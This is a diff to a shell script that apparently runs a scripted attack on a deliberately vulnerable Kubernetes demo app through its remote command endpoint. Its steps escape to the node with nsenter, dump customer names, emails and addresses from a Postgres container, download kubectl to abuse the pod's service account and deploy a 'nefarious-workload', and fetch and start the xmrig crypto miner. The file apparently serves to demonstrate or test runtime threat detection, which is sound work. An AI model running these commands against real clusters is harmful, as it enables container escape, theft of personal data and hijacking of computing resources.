@@ -28,7 +28,13 @@ echo "6. Exfil some data from another container running on the same Node"
 POSTGRES_ID=$(curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name postgres-sakila -q')
 curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c 'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id)'"
 
-echo "7. Exploit running a script to run a crypto miner"
+echo "7. Call the Kubernetes API via security-playground's K8s ServiceAccount"
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl -O https://s3.us-west-2.amazonaws.com/amazon-eks/1.26.4/2023-05-11/bin/linux/amd64/kubectl'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:110623'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'
+
+echo "8. Exploit running a script to run a crypto miner"
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O xmrig.tar.gz'
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=/app/xmrig-6.18.1/xmrig --dry-run'
